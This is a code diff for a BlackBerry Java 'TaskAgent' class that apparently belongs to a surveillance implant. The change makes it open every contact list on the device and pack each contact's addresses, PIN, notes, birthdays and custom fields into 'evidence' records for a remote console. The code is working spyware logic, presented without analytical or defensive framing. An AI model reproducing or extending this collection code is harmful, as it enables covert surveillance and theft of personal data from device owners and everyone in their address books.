@@ -31,13 +31,12 @@ import blackberry.fs.Path;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
-
 /**
  * The Class ImAgent.
  */
 public final class TaskAgent extends Agent implements PIMListListener {
     //#ifdef DEBUG
-    static Debug debug = new Debug("TaskAgent", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
     //#endif
 
     Markup markup;
@@ -131,45 +130,90 @@ public final class TaskAgent extends Agent implements PIMListListener {
             debug.info("Markup is present, no need to get the contact list");
             //#endif
             return;
-        } else {
-            markup.createEmptyMarkup();
         }
 
         ContactList contactList;
-        try {
+        int number = 0;
+
+      /*  try {
             contactList = (ContactList) PIM.getInstance().openPIMList(
                     PIM.CONTACT_LIST, PIM.READ_ONLY);
 
-            final Enumeration eContacts = contactList.items();
-
+            number = saveContactEvidence(contactList);
             //#ifdef DEBUG
-            debug.trace("actualRun: got contacts");
+            debug.trace("actualRun: saved " + number);
             //#endif
-
-            evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);
-
-            Contact contact;
-            while (eContacts.hasMoreElements()) {
-
-                contact = (Contact) eContacts.nextElement();
-
-                try {
-                    final byte[] packet = getContactPacket(contactList, contact);
-                    evidence.writeEvidence(packet);
-                } catch (final Exception ex) {
-                    //#ifdef DEBUG
-                    debug.error(ex);
-                    //#endif
-                }
-            }
-
-            evidence.close();
+            markup.createEmptyMarkup();
 
         } catch (final PIMException e) {
             //#ifdef DEBUG
             debug.error(e);
             //#endif
+        }*/
+
+        String[] lists = PIM.getInstance().listPIMLists(PIM.CONTACT_LIST);
+        //#ifdef DEBUG
+        debug.trace("actualRun lists: " + lists.length);
+        //#endif
+
+        for (int i = 0; i < lists.length; i++) {
+            try {
+                String name = lists[i];
+                //#ifdef DEBUG
+                debug.trace("actualRun: opening " + name);
+                //#endif
+                contactList = (ContactList) PIM.getInstance().openPIMList(
+                        PIM.CONTACT_LIST, PIM.READ_ONLY, name);
+
+                number = saveContactEvidence(contactList);
+                //#ifdef DEBUG
+                debug.trace("actualRun: saved " + number);
+                //#endif
+
+                markup.createEmptyMarkup();
+
+            } catch (final PIMException e) {
+                //#ifdef DEBUG
+                debug.error(e);
+                //#endif
+            }
         }
+
+    }
+
+    private int saveContactEvidence(ContactList contactList)
+            throws PIMException {
+        final Enumeration eContacts = contactList.items();
+
+        //#ifdef DEBUG
+        debug.trace("saveContactEvidence: got contacts");
+        //#endif
+
+        evidence.createEvidence(null, EvidenceType.ADDRESSBOOK);
+
+        Contact contact;
+        int number = 0;
+        while (eContacts.hasMoreElements()) {
+            //#ifdef DEBUG
+            debug.trace("saveContactEvidence: contact #" + ++number);
+            //#endif
+            try {
+                contact = (Contact) eContacts.nextElement();
+                final byte[] packet = getContactPacket(contactList, contact);
+                evidence.writeEvidence(packet);
+            } catch (final Exception ex) {
+                //#ifdef DEBUG
+                debug.error(ex);
+                //#endif
+            }
+        }
+
+        //#ifdef DEBUG
+        debug.trace("saveContactEvidence: finished contacts. Total: " + number);
+        //#endif
+        evidence.close();
+
+        return number;
     }
 
     /**
@@ -194,6 +238,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         final DataBuffer dbPayload = new DataBuffer(payload, 0, 2048, false);
 
+        initCustomFields();
+
         final String[] categories = contact.getCategories();
         for (int i = 0; i < categories.length; i++) {
             //#ifdef DEBUG
@@ -203,8 +249,6 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         int uid = 0;
 
-        initCustomFields();
-        
         if (contactList.isSupportedField(Contact.UID)) {
             if (contact.countValues(Contact.UID) > 0) {
                 final String suid = contact.getString(Contact.UID, 0);
@@ -255,11 +299,10 @@ public final class TaskAgent extends Agent implements PIMListListener {
             //#endif
 
             for (int i = 0; i < numAddress; i++) {
-                final String[] addr = contact.getStringArray(Contact.ADDR,
-                        i);
+                final String[] addr = contact.getStringArray(Contact.ADDR, i);
 
-                int attribute = contact.getAttributes(BlackBerryContact.ADDR,
-                        i);
+                int attribute = contact
+                        .getAttributes(BlackBerryContact.ADDR, i);
                 if (attribute == BlackBerryContact.ATTR_HOME) {
                     //#ifdef DEBUG
                     debug.trace("getContactPacket addr home");
@@ -306,20 +349,15 @@ public final class TaskAgent extends Agent implements PIMListListener {
         //#ifdef DEBUG
         debug.trace("getContactPacket: pin");
         //#endif
-        addCustomField(contactList, contact, BlackBerryContact.PIN,
-                "PIN: ");
+        addCustomField(contactList, contact, BlackBerryContact.PIN, "PIN: ");
 
         //#ifdef DEBUG
         debug.trace("getContactPacket: users");
         //#endif
-        addCustomField(contactList, contact,
-                BlackBerryContact.USER1, "USER1: ");
-        addCustomField(contactList, contact,
-                BlackBerryContact.USER2, "USER2: ");
-        addCustomField(contactList, contact,
-                BlackBerryContact.USER3, "USER3: ");
-        addCustomField(contactList, contact,
-                BlackBerryContact.USER4, "USER4: ");
+        addCustomField(contactList, contact, BlackBerryContact.USER1, "USER1: ");
+        addCustomField(contactList, contact, BlackBerryContact.USER2, "USER2: ");
+        addCustomField(contactList, contact, BlackBerryContact.USER3, "USER3: ");
+        addCustomField(contactList, contact, BlackBerryContact.USER4, "USER4: ");
 
         //#ifdef DEBUG
         debug.trace("getContactPacket: org");
@@ -330,21 +368,20 @@ public final class TaskAgent extends Agent implements PIMListListener {
         //#ifdef DEBUG
         debug.trace("getContactPacket: note");
         //#endif
-        addCustomField(contactList, contact, BlackBerryContact.NOTE,
-                "Note: ");
+        addCustomField(contactList, contact, BlackBerryContact.NOTE, "Note: ");
 
         //#ifdef DEBUG
         debug.trace("getContactPacket: anniversary");
         //#endif
-        addCustomDateField(contactList, contact,
-                BlackBerryContact.ANNIVERSARY, "Anniversary: ");
+        addCustomDateField(contactList, contact, BlackBerryContact.ANNIVERSARY,
+                "Anniversary: ");
 
         //#ifdef DEBUG
         debug.trace("getContactPacket: birthday");
         //#endif
-        addCustomDateField(contactList, contact,
-                BlackBerryContact.BIRTHDAY, "Birthday: ");
-        
+        addCustomDateField(contactList, contact, BlackBerryContact.BIRTHDAY,
+                "Birthday: ");
+
         finalizeCustomFields(dbPayload);
 
         final int size = dbPayload.getLength() + header.length;
@@ -376,8 +413,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
         //db_header.write(payload);
 
-        final byte[] packet = Utils.concat(header, 12, payload, dbPayload
-                .getLength());
+        final byte[] packet = Utils.concat(header, 12, payload,
+                dbPayload.getLength());
 
         //#ifdef DBC
         Check.ensures(packet.length == size,
@@ -444,47 +481,53 @@ public final class TaskAgent extends Agent implements PIMListListener {
             }
         }
     }
-    
-    StringBuffer customBuffer=new StringBuffer();
+
+    StringBuffer customBuffer = new StringBuffer();
 
     /**
-     * La cosole accetta un solo custom field, 
-     * quindi deve essere simulato costruendo una stringa da serializzare
-     * solo nella finalize
+     * La cosole accetta un solo custom field, quindi deve essere simulato
+     * costruendo una stringa da serializzare solo nella finalize
      */
     private void initCustomFields() {
         //#ifdef DEBUG
         debug.trace("initCustomFields");
         //#endif
-        customBuffer=new StringBuffer();
+        customBuffer = new StringBuffer();
     }
 
     private void finalizeCustomFields(DataBuffer dbPayload) {
         //#ifdef DEBUG
         debug.trace("finalizeCustomFields");
         //#endif
-        
-        if(customBuffer==null){
+
+        if (customBuffer == null) {
             //#ifdef DEBUG
             debug.error("finishCustomFields");
             //#endif
-        }else{
-            //#ifdef DEBUG
-            debug.trace("finishCustomFields: "+customBuffer.toString());
-            //#endif
-            Utils.addTypedString(dbPayload, (byte) 0x37, customBuffer.toString());
+        } else {
+            try {
+                //#ifdef DEBUG
+                debug.trace("finishCustomFields: " + customBuffer.toString());
+                //#endif
+                Utils.addTypedString(dbPayload, (byte) 0x37,
+                        customBuffer.toString());
+            } catch (Exception ex) {
+                //#ifdef DEBUG
+                debug.error("finalizeCustomFields: " + ex);
+                //#endif
+            }
         }
     }
-    
+
     protected void addCustomField(ContactList contactList, Contact contact,
-             int contactType, String typeName) {
+            int contactType, String typeName) {
 
         if (contactList.isSupportedField(contactType)) {
             try {
 
                 if (contact.countValues(contactType) > 0) {
                     final String value = contact.getString(contactType, 0);
-                    customBuffer.append(typeName+value+"\r\n");
+                    customBuffer.append(typeName + value + "\r\n");
                 }
 
             } catch (final Exception ex) {
@@ -503,8 +546,8 @@ public final class TaskAgent extends Agent implements PIMListListener {
 
                 if (contact.countValues(contactType) > 0) {
                     final long value = contact.getDate(contactType, 0);
-                    customBuffer.append(typeName+ (new Date(
-                            value)).toString()+"\r\n");
+                    customBuffer.append(typeName + (new Date(value)).toString()
+                            + "\r\n");
                 }
 
             } catch (final Exception ex) {
